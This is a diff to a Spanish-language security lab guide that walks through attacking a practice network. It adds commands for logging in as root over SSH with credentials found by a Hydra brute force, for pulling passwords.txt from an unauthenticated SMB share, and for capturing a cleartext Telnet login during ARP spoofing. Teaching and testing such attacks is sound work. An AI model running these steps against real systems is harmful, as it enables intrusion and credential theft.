@@ -246,7 +246,11 @@ y sin límite de intentos efectivo. Hydra automatiza la fuerza bruta.
 # tráfico externo hacia la red interna (mala práctica grave)
 hydra -l root -p root ssh://192.168.58.10
 ```
-
+```bash
+# Se puede entrar a interal-server con:
+ ssh root@192.168.58.10
+ #user: root, password: root tal y como pone en la respuesta de hydra.
+```
 **Qué demuestra:** la combinación de credenciales débiles + SSH expuesto sin
 protección + firewall permisivo permite acceso root completo al servidor
 interno en menos de un segundo. En el Bloque 3, fail2ban bloquearía la IP
@@ -300,7 +304,7 @@ El share `confidential` tiene `guest ok = yes`, accesible sin credenciales.
 **Desde external-kali:**
 
 ```bash
-e
+smbclient //192.168.58.10/confidential -N
 smb: \> ls
 smb: \> get passwords.txt
 smb: \> exit
@@ -347,6 +351,9 @@ sudo tcpdump -i eth1 -A -s0 port 23
 Mientras `tcpdump` está activo, abrir otra terminal y conectarse por Telnet
 a `dmz-server` desde cualquier máquina. Las credenciales aparecerán en texto
 plano en la captura.
+```bash
+telnet 192.168.57.10
+```
 
 ```bash
 # Para detener el ARP spoofing al terminar CTRL+C o:
